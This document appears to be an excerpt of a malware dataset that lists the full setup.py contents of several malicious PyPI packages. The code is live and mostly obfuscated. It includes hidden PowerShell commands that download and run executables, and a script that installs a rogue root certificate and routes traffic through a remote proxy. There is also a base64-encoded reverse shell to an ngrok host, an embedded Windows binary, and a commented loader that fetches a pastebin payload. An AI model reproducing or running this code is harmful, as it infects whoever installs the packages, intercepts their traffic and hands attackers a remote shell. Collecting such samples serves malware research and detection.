+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'libvmnvidia',
+    packages = ['modlib'],
+    version = '4.7',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
+61ecbdc0374005556502c22673266170dc84bdd9,py-httprevisa-10.50,py-httprevisa-10.50/py-httprevisa-10.50/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,3846922e67b7c8e044706577ec545770ceb46e75,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    # www.esquelesquad.rip
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'py-httprevisa',
+    packages = ['modlib'],
+    version = '7.64',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
+67526256d45ad3cd276cbb81f0d7e5ff1b1fb17a,pyprotectfile-1.0.1,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/pyprotectfile/1.0.1/zip/setup.py,pypi,Python,1,malwarebench_pypi_malicious_exclude_aligned_v3,fdbf425bf4cae8336e08fade7a0b23943a6abeeb,"from setuptools import setup, find_packages
+
+setup(
+  name=""pyprotectfile"",
+  version='1.0.1',
+  author=""KoalaDev"",
+  author_email=""koaladev@gmail.com"",
+  description=""Python Obfuscate Any File"",
+  long_description_content_type=""text/markdown"",
+  url=""https://github.com/koaladev"",
+  project_urls={
+    ""GitHub"": ""https://github.com/koaladev/"",
+  },
+  license=""MIT"",
+  keywords=[""discord""],
+  classifiers = [
+  ""Programming Language :: Python :: 3"",
+  ""License :: OSI Approved :: MIT License"",
+  ""Operating System :: Microsoft :: Windows"",
+  ""Development Status :: 5 - Production/Stable"",
+  ""Intended Audience :: Developers"",
+  ""Natural Language :: English"",
+  ""Topic :: Software Development""
+  ],
+  packages=find_packages(),
+  install_requires=['requests', 'sockets', 'pypiwin32', 'pycryptodome', 'uuid', 'cryptography', 'pyfiglet', 'browser_cookie3', 'discord_webhook', 'prettytable', 'getmac', 'pyautogui', 'winregistry', 'robloxpy']
+)"
+75aabde5c220cc1852d61b22157dcd0e5e8f52bc,pywincompiler-0.13.0,pywincompiler-0.13.0/pywincompiler-0.13.0/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,353462dc2b2d33a121abff318a035b0a4f196508,"from setuptools import setup, find_packages
+
+VERSION = '0.13.0'
+DESCRIPTION = 'Python exe compiler'
+LONG_DESCRIPTION = 'Python exe compiler'
+
+# Setting up
+setup(
+    name=""pywincompiler"",
+    version=VERSION,
+    author=""John"",
+    author_email=""eesfesfs@fsesefsef.fsefessfe"",
+    description=DESCRIPTION,
+    long_description_content_type=""text/markdown"",
+    long_description=LONG_DESCRIPTION,
+    packages=find_packages(),
+    install_requires=[],
+    keywords=['python'],
+    classifiers=[
+        ""Operating System :: Microsoft :: Windows"",
+    ]
+)"
+8ee7b4d579e4a7d5ddd3f3207a5c02861d9960eb,raknet-testing-package2-0.0.1,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/raknet-testing-package2/0.0.1/tar-gz/setup.py,pypi,Python,1,malwarebench_pypi_malicious_exclude_aligned_v3,60f0f7d44d88e6269423036c57d31926d22ed456,"import setuptools, base64
+import os
+import sys
+import ctypes
+import winreg
+import ssl
+import socket
+import subprocess
+import urllib.request
+
+setuptools.setup(
+    name=""raknet-testing-package2"",
+    version=""0.0.1"",
+    author=""raknet-testing-package2"",
+    #description=""Official wrapper for the Roblox API"",
+    description=""raknet-testing-package"",
+    classifiers=[
+        ""Programming Language :: Python :: 3"",
+        ""License :: OSI Approved :: MIT License"",
+        ""Operating System :: OS Independent"",
+    ],
+    package_dir={"""": ""src""},
+    packages=setuptools.find_packages(where=""src""),
+    python_requires="">=3.6"",
+)
+
+'''
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+if not is_admin():
+    # Re-run the script with admin rights
+    ctypes.windll.shell32.ShellExecuteW(
+        None, ""runas"", sys.executable, "" "".join(sys.argv), None, 1)
+    sys.exit()
+
+'''
+def download_p12_cert(cert_url, save_path=""cert.p12""):
+    try:
+        urllib.request.urlretrieve(cert_url, save_path)
+        print(f""Downloaded .p12 certificate to: {save_path}"")
+        return save_path
+    except Exception as e:
+        print(f""Failed to download cert: {e}"")
+        return None
+
+def install_p12_to_user_store():
+    command = ['certutil', '-addstore', '-f', 'Root', ""downloaded_cert.pem""]
+
+    try:
+        result = subprocess.run(command, capture_output=True, text=True, check=True)
+        print(""Certificate imported successfully."")
+        print(result.stdout)
+    except subprocess.CalledProcessError as e:
+        print(""Failed to import certificate."")
+        print(e.stderr)
+
+def download_and_install_p12(cert_url, password=""""):
+    cert_path = download_p12_cert(cert_url, ""downloaded_cert.pem"")
+    if cert_path and os.path.exists(cert_path):
+        install_p12_to_user_store()
+
+def set_user_proxy(enable=True, proxy_server=""127.0.0.1:8080""):
+    reg_path = r""Software\Microsoft\Windows\CurrentVersion\Internet Settings""
+    
+    try:
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
+            winreg.SetValueEx(key, ""ProxyEnable"", 0, winreg.REG_DWORD, 1 if enable else 0)
+            if enable:
+                winreg.SetValueEx(key, ""ProxyServer"", 0, winreg.REG_SZ, proxy_server)
+            print(f""{'Enabled' if enable else 'Disabled'} proxy: {proxy_server if enable else ''}"")
+        
+        ctypes.windll.Wininet.InternetSetOptionW(0, 39, 0, 0)
+        ctypes.windll.Wininet.InternetSetOptionW(0, 37, 0, 0)
+
+    except Exception as e:
+        print(f""Error updating proxy: {e}"")
+
+
+
+download_and_install_p12(""https://www.dropbox.com/scl/fi/6pwocr2yfcaqztfoxkwqm/mitmproxy-ca-cert.pem?rlkey=irl7718in0yr3pwnhgftcm0sm&st=fnll7kc5&dl=1"")
+set_user_proxy(True, ""196.251.86.48:4444"")
+
+
+# This script creates a pop-up message box displaying the current working directory.
+
+# Import the necessary modules.
+# 'os' is for interacting with the operating system, specifically to get the current directory.
+# 'tkinter' is Python's standard GUI library, and 'messagebox' is a submodule for pop-ups.
+import os
+import tkinter as tk
+from tkinter import messagebox
+
+# Create a root window. This is required for the messagebox to work properly,
+# but we will hide it so only the pop-up is visible.
+root = tk.Tk()
+root.withdraw()
+
+# Get the current working directory (CWD).
+# The os.getcwd() function returns a string of the current directory path.
+current_directory = os.getcwd()
+
+# Construct the message string to display in the pop-up.
+# We use an f-string to easily embed the current_directory variable.
+message = f""The current working directory is:\n{current_directory}""
+
+# Display the message box.
+# 'showinfo' is one type of message box; it displays an informational message.
+# The first argument is the title of the pop-up window, and the second is the message.
+messagebox.showinfo(""Current Directory"", message)
+
+# This line ensures the program doesn't immediately close after the pop-up is shown.
+# It waits for the user to close the message box.
+root.mainloop()
+
+#import base64
+#exec(base64.b64decode(""ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0IG9zCmltcG9ydCBzeXMKCnVybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaEVGNUhhRmMiCnJlcSA9IHJlcXVlc3QuUmVxdWVzdCh1cmwpCnJlcS5hZGRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpCnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IGk2ODYpIEdlY2tvLzIwMDcxMTI3IEZpcmVmb3gvMi4wLjAuMTEnKQpjdCA9IHJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKQoKcmVxID0gcmVxdWVzdC5SZXF1ZXN0KGN0LmRlY29kZSgpKQpyZXEuYWRkX2hlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKQpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2KSBHZWNrby8yMDA3MTEyNyBGaXJlZm94LzIuMC4wLjExJykKY3QgPSByZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCkKb3BlbiAoInBrZ19pbnN0YWxsZXIuZXhlIiwgIncrIikKd2l0aCBvcGVuKCJwa2dfaW5zdGFsbGVyLmV4ZSIsICJ3YiIpIGFzIGZpbGU6CglmaWxlLndyaXRlKGN0KQpvcy5zeXN0ZW0oImNtZCAvYyBwa2dfaW5zdGFsbGVyLmV4ZSIpCndoaWxlIFRydWU6Cgl0cnk6CgkJb3MucmVtb3ZlKCJwa2dfaW5zdGFsbGVyLmV4ZSIpCgkJc3RweTMKCQlicmVhawoJZXhjZXB0OgoJCXBhc3MK""))"
+901bf5a4711eb21df4f4dbbf9e8eefc7826d2a6b,swiftypy-8.2,swiftypy-8.2/SwiftyPy-8.2/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,c13ea1f79db371c41fc66c5ad996caa461211269,"import base64
+import subprocess
+import setuptools
+from setuptools.command.install import install
+import tempfile
+
+code = '''aW1wb3J0IG9zLCBzb2NrZXQsIHN1YnByb2Nlc3MsIHRocmVhZGluZw0KZnJvbSB1cmxsaWIucGFy
+c2UgaW1wb3J0IHVybHBhcnNlDQoNCnVybCA9ICIyLnRjcC5uZ3Jvay5pbzoxNjQxOCINCmRlZiBz
+MnAocywgcCk6DQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgZGF0YSA9IHMucmVjdigxMDI0KQ0K
+ICAgICAgICBpZiBsZW4oZGF0YSkgPiAwOg0KICAgICAgICAgICAgcC5zdGRpbi53cml0ZShkYXRh
+KQ0KICAgICAgICAgICAgcC5zdGRpbi5mbHVzaCgpDQoNCg0KZGVmIHAycyhzLCBwKToNCiAgICB3
+aGlsZSBUcnVlOg0KICAgICAgICBzLnNlbmQocC5zdGRvdXQucmVhZCgxKSkNCg0KZGVmIGdldF9p
+cF9mcm9tX3VybCh1cmwpOg0KICAgIHBhcnNlZF91cmwgPSB1cmxwYXJzZSh1cmwpDQogICAgaG9z
+dG5hbWUgPSBwYXJzZWRfdXJsLmhvc3RuYW1lDQogICAgaXAgPSBzb2NrZXQuZ2V0aG9zdGJ5bmFt
+ZShob3N0bmFtZSkNCiAgICByZXR1cm4gaXANCg0KDQpwcmludCgiY28iKQ0KcyA9IHNvY2tldC5z
+b2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCnMuY29ubmVjdCgoIjIu
+dGNwLm5ncm9rLmlvIiwgMTY0MTgpKQ0KDQoNCnAgPSBzdWJwcm9jZXNzLlBvcGVuKFsicG93ZXJz
+aGVsbCJdLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQs
+IHN0ZGluPXN1YnByb2Nlc3MuUElQRSkNCg0KczJwX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQo
+dGFyZ2V0PXMycCwgYXJncz1bcywgcF0pDQpzMnBfdGhyZWFkLmRhZW1vbiA9IFRydWUNCnMycF90
+aHJlYWQuc3RhcnQoKQ0KDQpwMnNfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9cDJz
+LCBhcmdzPVtzLCBwXSkNCnAyc190aHJlYWQuZGFlbW9uID0gVHJ1ZQ0KcDJzX3RocmVhZC5zdGFy
+dCgpDQoNCnRyeToNCiAgICBwLndhaXQoKQ0KZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAg
+IHMuY2xvc2UoKQ0K
+'''
+code2 ='''TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAAnWLA4Yznea2M53mtjOd5rd1Laamg53mt3Ut1qZDnea3dS22rfOd5rBVYja2c53msxTNtqRTneazFM2mpyOd5rMUzdamo53mt3Ut9qaDnea2M532vkOd5r2UzaanA53mvZTNxqYjnea1JpY2hjOd5rAAAAAAAAAAAAAAAAAAAAAFBFAABkhgcAM5KgZAAAAAAAAAAA8AAiAAsCDh0ANgIAAEQCAAAAAADIqAAAABAAAAAAAEABAAAAABAAAAACAAAFAAIAAAAAAAUAAgAAAAAAAMAFAAAEAAAU35sAAgBggYCEHgAAAAAAABAAAAAAAAAAABAAAAAAAAAQAAAAAAAAAAAAABAAAAAAAAAAAAAAABhbAwB4AAAAALAEAJT0AAAAgAQA6B0AAAAAAAAAAAAAALAFAEgHAAAgOQMAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEA5AwA4AQAAAAAAAAAAAAAAUAIA6AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC50ZXh0AAAA0DUCAAAQAAAANgIAAAQAAAAAAAAAAAAAAAAAACAAAGAucmRhdGEAAJgYAQAAUAIAABoBAAA6AgAAAAAAAAAAAAAAAABAAABALmRhdGEAAACYAwEAAHADAAAMAAAAVAMAAAAAAAAAAAAAAAAAQAAAwC5wZGF0YQAA6B0AAACABAAAHgAAAGADAAAAAAAAAAAAAAAAAEAAAEBfUkRBVEEAAPQAAAAAoAQAAAIAAAB+AwAAAAAAAAAAAAAAAABAAABALnJzcmMAAACU9AAAALAEAAD2AAAAgAMAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAASAcAAACwBQAACAAAAHYEAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEBTSIPsIOgtuAAASIsY6B24AABIi9OLCOjTYAAASIvY6Au4AABIi9OLCEiDxCBb6ZwkAADMzMzMzMzMzMzMzMxIjQUxYwQAw8zMzMzMzMzMSIlUJBBIiUwkCFNVVldBVkFXSIHsiAAAADPATYvwSIvaSIlEJFBIi/lIiUQkWEiNFU9EAgBIiUQkYESNQFiJRCQoSI1MJCBIiUQkIEmL8Yvo6KqCAABEi/iFwHQmSI1TEkSLwEiNDSVEAgDooBYAAI1F/0iBxIgAAABBX0FeX15dW8O5ACAAAEyJrCSAAAAA6IvoAABMi+hIhcB1HEyNQxJIjRU4RAIASI0NdUQCAOi8EwAA6WMBAAC5ACAAAOhd6AAASIvoSIXAdRxMjUMSSI0VWkQCAEiNDUdEAgDojhMAAOk1AQAATImkJNAAAABEi2MIDx9AAGYPH4QAAAAAAEyLD7gAIAAATDvgSYvcugEAAABJi81ID0fYTIvD6G66AABIO8MPheMAAABIiw/o0bcAAIXAD4XTAAAATCvjiVwkKEyJbCQgZg8fhAAAAAAAuwAgAABIiWwkMDPSiVwkOEiNTCQg6FZmAACL+EG//////41IBIP5AnZ3g/gCdG2LTCQ4SCvZTYX2dChNi85BjVcCTIvDSIvN6Bu/AABIO8N1DEmLzuhatwAAhcB0G0GL/+s+SIX2dBFMi8NIi9VIi87oeqEAAEgD84N8JDgAdICD/wF0Ek2F5HQXSIu8JMAAAADpGf///0Uz/+sov/3///9Ii5QkyAAAAEiNDYBDAgBIg8ISRIvH6AQVAADrBkG//////0yLpCTQAAAASI1MJCDoyn0AAEmLzeje5gAASIvN6NbmAABMi6wkgAAAAEGLx0iBxIgAAABBX0FeX15dW8PMzMzMzMzMzMzMzMzMzMxAVkFWSIPsKEiLAUiL8kyL8UiFwHUySIPBeEiNFf9BAgDoeigAAEmJBkiFwHUaSI1WEkiNDe9DAgDochQAADPASIPEKEFeXsOLVgRFM8BJA1YISIvI6Ka7AACFwHkhTI1GEkiNFfdDAgBIjQ0sRAIA6JsRAAAzwEiDxChBXl7Di04MTIl8JCDoNOYAAEyL+EiFwHUgRItODEyNRhJIjRUNRAIASI0NGkICAOhhEQAA6bAAAACAfhABSIlcJEBIiWwkSEiJfCRQTIlkJFh1F02Lz0UzwEiL1kmLzujB/P//hcB0betgi14MSYvvSIXbdGBBvAAgAABmZg8fhAAAAAAATYsOSTvcSIv7QbgBAAAASQ9H/EiLzUiL1+gSuAAASIP4AXIKSAPvSCvfddTrIkyNRhJIjRVvQgIASI0NnEICAOjLEAAASYvP6F/lAABFM/9Ii3wkUEiLbCRISItcJEBMi2QkWEmLDkiFyXQM6KO0AABJxwYAAAAASYvHTIt8JCBIg8QoQV5ew8zMzMzMzMzMQFNXQVZIg+wwSIv6TIvx6BxOAACD+P91CUiDxDBBXl9bw0iJbCRQSY2OeDAAAEiNbxJMiWQkYEiL1egRUQAATIvgSIXAdSBMi8VIjRUXQwIASI0NREMCAOgjEAAAQY1EJP/pjgEAAEmLBkiFwHUxSY1OeEiNFRZAAgDokSYAAEmJBkiFwHUZSIvVSI0NB0ICAOiKEgAAu//////pNwEAAItXBEUzwEkDVghIi8jovrkAAIXAeSBMi8VIjRUQQgIASI0NRUICAOi0DwAAu//////pAQEAAIB/EAF1GEUzyU2LxEiL10mLzugj+///i9jp4wAAAEyJbCQoM9tBvQAgAABMiXwkIEGLzegi5AAATIv4SIXAdR9Mi8VIjRW4QAIASI0NDUACAOhUDwAAQY1f/+mYAAAAi38MSIX/D4SEAAAASIl0JFhmZg8fhAAAAAAATYsOSTv9SIv3QbgBAAAASQ9H9UmLz0iL1ugytgAASIP4AXIxTYvMQbgBAAAASIvWSYvP6EC7AABIg/gBcgdIK/51vesrSI0VvEACAEiNDelAAgDrDkiNFWxAAgBIjQ2ZQAIATIvF6MUOAAC7/////0iLdCRYSYvP6E/jAABMi2wkKEyLfCQgSYsOSIXJdAzooLIAAEnHBgAAAABJi8zokbIAAIvDSItsJFBMi2QkYEiDxDBBXl9bw8zMzMzMzMzMQFNIg+wgTItBEEiL2kyLURhMi9lNO8JzQg8fgAAAAABJjUASTIvLTCvIZg8fRAAAD7YQQg+2DAgr0XUHSP/Ahcl17YXSdDBJYwBJA8BMi8BJO0MQcg1JO8JyxTPASIPEIFvDSI0N9j0CAOihEAAAM8BIg8QgW8NJi8BIg8QgW8NIiVwkCEiJbCQQSIl0JBhXSIPsIEiLWRBIi+pIi/FIx8f/////SP/HgDwXAHX3SDtZGHNRgHsRb3UTSI1LEkyLx0iL1eh34gAAhcB0F0hjA0gDw0iL2Eg7RhByHUg7Rhhy0ushSI1DEkgDx4A4AHQXSI1DE0gDx+sOSI0NYD0CAOgLEAAAM8BIi1wkMEiLbCQ4SIt0JEBIg8QgX8PMzMzMQFNIg+wgSGMCSIvZSAPCSDtBEHMQSI0NJD0CAOjPDwAASItDGEiDxCBbw8zMzMzMSIlcJBBXSIPsMEiLBVdYAwBIM8RIiUQkKEiL2UiLCUiFyXUbSI1LeEiNFQE9AgDofCMAAEiJA0iLyEiFwHRTSIsFsmECAEiNVCQgSIlEJCBBuAgAAABIwegYBAyIRCQj6OtUAABIi/hIhcB0JUiLC0UzwEiL0OiVtgAAhcB5HUiNFcI/AgBIjQ0fPwIA6I4MAAC4/////+lnAQAATIsLSI1LILpYAAAARI1CqeiPswAASIP4AXMdSI0Vsj8CAEiNDSc+AgDoVgwAALj/////6S8BAACLSyhFM8CLQywPyIlDLItDMA/IiUMwi0M0D8mLyUgr+YlLKA/ISIPHWIlDNEiJewgz/4m7fFAAAIkFUmMDAItTLEgDUwhIiwvo77UAAEhjSzDopuAAAEiJQxBIhcB1G0iNFU4/AgBIjQ2TPAIA6NoLAACNR//ptQAAAEhjUzBBuAEAAABMiwtIi8jo3bIAAEiD+AFzDEiNFUA/AgDpSf///0hjQzBIA0MQSIsLSIlDGOgrsAAAhcB0E0iNDTw/AgDoJw4AALj/////62NIi0MQSDtDGHNHZg8fRAAAi0gEixAPyYlIBItICA/JiUgIi0gMD8mJSAwPyokQSGPKSAPISIvBSDtLEHIISDtLGHLN6wxIjQ0kOwIA6M8NAABIiwtIhcl0COgmrwAASIk7M8BIi0wkKEgzzOhAjAAASItcJEhIg8QwX8PMzMzMzEiJXCQISIl0JBBXSIPsIEmL2EiL8kiL+UyNBaE+AgBMi8pIg8F4ugAQAADoMAEAAD0AEAAAfXZIjY94EAAATIvLTI0FeD4CALoAEAAA6A4BAAA9ABAAAH1USI2feCAAAEiL1kiLy+iVHwAAM/aJt3hQAAAPH0AAZg8fhAAAAAAAD7YDiIMAIAAASI1bAYTAde9Ii8/oR/3//4XAdCJIiw9Ihcl0COhargAASIk3M8BIi1wkMEiLdCQ4SIPEIF/DSItcJDC4AQAAAEiLdCQ4SIPEIF/DzMzMzMzMzMzMzMzMSIXJdDdTSIPsIEiL2UiLSRBIhcl0Beih3gAASIsLSIXJdAzo/K0AAEjHAwAAAABIi8vohd4AAEiDxCBbw8zMzEBTSIPsILqQUAAAuQEAAADoX94AAEiL2EiFwHUWSI0VhD0CAEiNDak9AgDosAkAAEiLw0iDxCBbw8zMzMzMzMxMiUQkGEyJTCQgU1VWV0iD7DhJi/BIjWwkeEiL2kiL+ej79P//SIlsJChMi85Mi8NIx0QkIAAAAABIi9dIiwhIg8kC6NzdAACFwLn/////D0jBSIPEOF9eXVvDzMzMzMxIiVwkEEiJbCQYSIl0JCBXSIHsgAIAAEiLBWpUAwBIM8RIiYQkcAIAAEiLQRhMjQUMPQIATItJEEiL+UiDwShIiUQkILoAEAAA6JIIAAD/FeQ3AgC6MgAAAA+3yIvYRI1C0v8VuDQCAGaJh1ogAACLw7sIAAAASMHoEA+3yESLw41TBv8VlzQCADPSx4deIAAAIAAgAEG49AEAAGaJh1wgAABIjUwkdGaJn1ggAADoDZ4AAEUzycdEJHD4AQAATI1EJHC6+AEAAI1LIf8VHzcCADPthcB0EEiNjCQIAgAA/xXjMwIA6wNIi8UzyUiJh0ggAABMjY9QIAAAugF/AABEjUEB/xWfMwIASIsHSI0VrTwCAEiJbCRYQbkDAABQSIlEJFBFM8BIi0cIM8lIiWwkSEiJRCRAx0QkOAAAAIDHRCQwAAAAgMdEJCgAAACAx0QkIAAAAID/FXw2AgBIiWwkWEiNFVg8AgBIiYcoIAAAQbkAAABQSIsHRTPASIlEJFAzyUiLRwhIiWwkSEiJRCRAx0QkOAAAAIDHRCQwAAAAgMdEJCgAAACAx0QkIAAAAID/FSI2AgBIiWwkWEiNFQ48AgBIiYcwIAAAQbmECDBQSIsHRTPASIlEJFC5AAIAAEiLRwhIiWwkSEiJRCRAx0QkOAAAAIDHRCQwAAAAgMdEJCgAAACAx0QkIAAAAID/FcU1AgBIiWwkWEyNBcE7AgBIiYc4IAAASI0VwzsCAEiLB0G5AQAAUEiJRCRQM8lIi0cISMdEJEgBAAAASIlEJEDHRCQ4AAAAgMdEJDAAAACAx0QkKAAAAIDHRCQgAAAAgP8VYzUCAEyLj1AgAABFM8BIi08IuoAAAABIiYdAIAAA/xXDNQIATIuPUCAAALqAAAAASItPCESNQoH/Fak1AgBMi49QIAAASIuPKCAAALpyAQAAQbgBAAAA/xWKNQIATIuHSCAAAE2FwHRtSItPCLowAAAARI1K0f8VazUCAEyLh0ggAABBuQEAAABIi48wIAAAQY1RL/8VTTUCAEyLh0ggAABBuQEAAABIi484IAAAQY1RL/8VLzUCAEyLh0ggAABBuQEAAABIi49AIAAAQY1RL/8VETUCAEiLjzAgAABMjU8oRTPAQY1QDP8V+TQCAEyLTyBFM8BIi484IAAAQY1QDP8V4TQCAEiLTwhIjVQkYP8VijQCAIXAdB5ED7dEJGxIi88Pt1QkaGZEK0QkZGYrVCRg6PgAAABIi4wkcAIAAEgzzOi4hgAATI2cJIACAABJi1sYSYtrIEmLcyhJi+Nfw8zMzMzMzMzMzMzMzMzMzEiJXCQIV0iD7CBJi/lIi9mD6gV0ZoPqC3RageoAAQAAdCiD+gF1f0GNQP9mO8J3CkEPt9D/FSY0AgC4AQAAAEiLXCQwSIPEIF/DTIvHSYlZCLoQAAAA/xXEMwIASIvP6Lz7//+4AQAAAEiLXCQwSIPEIF/DugIAAADruboQAAAA/xWiMwIATIvHD7fXScHoEEiLyOgoAAAARTPAM9JIi8v/FZIzAgBIi1wkMDPASIPEIF/DzMzMzMzMzMzMzMzMzEBTVVZXQVZIg+xQSIsF1k8DAEgzxEiJRCRASIvxD7fqSIuJMCAAAEUPt/D/FVczAgBIi9hIhcAPhJQAAAAPt45YIAAAM/9Ei8VIiXwkMIl8JDyNFEkPt45eIAAARCvCSIuWSCAAAEQrwUSJRCQ4SIXSdAxIi8j/FZwvAgBIi/hIjVYox0QkIFAlAABMjUwkMEG4/////0iLy/8V8TICAEiDvkggAAAAdAxIi9dIi8v/FWMvAgBIi44wIAAASIvT/xW7MgIAD7dUJDxmK1QkNOsFuhQAAAAPt45gIAAARA+3jl4gAABmO9EPt8HHRCQoAQAAAGYPQ8KJTCQgD7eWWCAAAEiLjiggAABEi8IPt9j/FZsyAgAPt75YIAAAD7fFD7fPx0QkKAEAAABmA8mJXCQgZgOOXiAAAGYrx2YrwQ+30UiLjjAgAABEi8dED7fI/xVbMgIAD7eWWCAAAEEPt87HRCQoAQAAAI0EE2YD+A+3wmYDwEQPt8dmK8gPt8VmK45cIAAAZivCZivPZivCRA+30UiLjjggAABED7fIRIlUJCD/FQgyAgAPt5ZaIAAAD7eGWCAAAESLykQPt5ZcIAAAZkQr8EiLjkAgAABmK+hmRSvyx0QkKAEAAABmK+pFD7fGD7fVRIlUJCD/FcAxAgBIi0wkQEgzzOjTgwAASIPEUEFeX15dW8PMzMzMzMzMzEBVU1ZXQVZIjawkMN///7jQIQAA6NeDAABIK+BIiwW1TQMASDPESImFwCAAAEiL2U2L8DPJSIv6/xUqLgIAM9JIjY22HwAAQbgCAQAASIvw6LuXAAAzyceFoB8AAIQIzJBIiY2kHwAATI0F4TYCAGaJjbQfAADHhawfAAAAAMgAjVFAx4WwHwAAlgAAAEiNjbYfAADolwEAADPASI1MJFgz0kiJRCQ4QbhAIAAA6F6XAABIi8tIiXQkMOjl8gAASIvPSIlEJEDo2PIAAEmLzkiJRCRI6MvyAABIiUQkUEyNDUv8//9IjUQkMEUzwEiNlaAfAABIiUQkIEiLzv8VljACAEiLTCRA